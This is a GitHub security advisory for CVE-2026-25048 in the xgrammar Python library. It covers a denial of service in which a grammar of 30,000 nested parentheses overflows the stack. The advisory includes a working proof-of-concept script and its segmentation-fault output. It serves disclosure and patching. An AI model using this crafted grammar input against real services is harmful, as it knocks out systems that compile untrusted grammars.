# [H] xgrammar vulnerable to DoS via multi-layer nesting

## Summary
Severity: High
Advisory: GHSA-7rgv-gqhr-fxg3
CVE: CVE-2026-25048
CWE: CWE-674
Ecosystem: PyPI
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-03-05
Source: https://github.com/advisories/GHSA-7rgv-gqhr-fxg3
Type: github-advisory

## Affected
- PyPI: `xgrammar` — affected >=0 <0.1.32

## Details
### Summary

The multi-level nested syntax caused a segmentation fault (core dump).


### Details

A trigger stack overflow or memory exhaustion was caused by constructing a malicious grammar rule containing 30,000 layers of nested parentheses.

### PoC

```
#!/usr/bin/env python3
"""
XGrammar - Math Expression Generation Example
"""

import xgrammar as xgr
import torch
from transformers import AutoModelForCausalLM, AutoTokenizer, AutoConfig

s = '(' * 30000 + 'a'
grammar = f"root ::= {s}"

def main():
    device = "cuda" if torch.cuda.is_available() else "cpu"
    model_name = "Qwen/Qwen2.5-0.5B-Instruct"
    
    # Load model
    model = AutoModelForCausalLM.from_pretrained(
        model_name,
        torch_dtype=torch.float16 if device == "cuda" else torch.float32,
        device_map=device
    )
    tokenizer = AutoTokenizer.from_pretrained(model_name)
    config = AutoConfig.from_pretrained(model_name)
    
    # Math expression grammar
    math_grammar = grammar
    
    # Setup
    tokenizer_info = xgr.TokenizerInfo.from_huggingface(
        tokenizer,
        vocab_size=config.vocab_size
    )
    compiler = xgr.GrammarCompiler(tokenizer_info)
    compiled_grammar = compiler.compile_grammar(math_grammar)
    
    # Generate
    prompt = "Math: "
    inputs = tokenizer(prompt, return_tensors="pt").to(device)
    
    xgr_processor = xgr.contrib.hf.LogitsProcessor(compiled_grammar)
    
    output_ids = model.generate(
        **inputs,
        max_new_tokens=50,
        logits_processor=[xgr_processor]
    )
    
    result = tokenizer.decode(
        output_ids[0][len(inputs.input_ids[0]):],
        skip_special_tokens=True
    )
    
    print(f"Generated expression: {result}")

if __name__ == "__main__":
    main()
```



```
> pip show xgrammar
Name: xgrammar
Version: 0.1.31
Summary: Efficient, Flexible and Portable Structured Generation
Home-page: 
Author: MLC Team
Author-email: 
License: Apache 2.0
Location: /home/yuelinwang/.local/lib/python3.10/site-packages
Requires: numpy, pydantic, torch, transformers, triton, typing-extensions
Required-by: 

> python3 1.py 
`torch_dtype` is deprecated! Use `dtype` instead!
Segmentation fault (core dumped)
```


### Impact

DoS

## References
- https://github.com/mlc-ai/xgrammar/security/advisories/GHSA-7rgv-gqhr-fxg3
- https://nvd.nist.gov/vuln/detail/CVE-2026-25048
- https://github.com/mlc-ai/xgrammar
- https://github.com/mlc-ai/xgrammar/releases/tag/v0.1.32
